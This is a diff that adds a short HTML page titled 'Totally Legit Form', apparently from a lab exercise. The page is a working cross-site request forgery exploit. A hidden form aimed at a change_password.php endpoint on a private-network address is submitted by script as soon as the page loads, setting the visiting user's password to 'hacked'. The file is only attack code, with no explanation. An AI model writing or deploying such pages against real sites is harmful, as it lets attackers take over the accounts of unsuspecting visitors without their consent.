@@ -1,0 +1,14 @@
+<html>
+
+<head>
+  <title>Totally Legit Form</title>
+  <form action="http://192.168.213.183/change_password.php" method="GET", id="csrf_form">
+    <input type="hidden" name="password" value="hacked"><br /><br />
+  </form>
+  <script>
+    document.getElementById('csrf_form').submit()
+  </script>
+</head>
+
+</html>
+
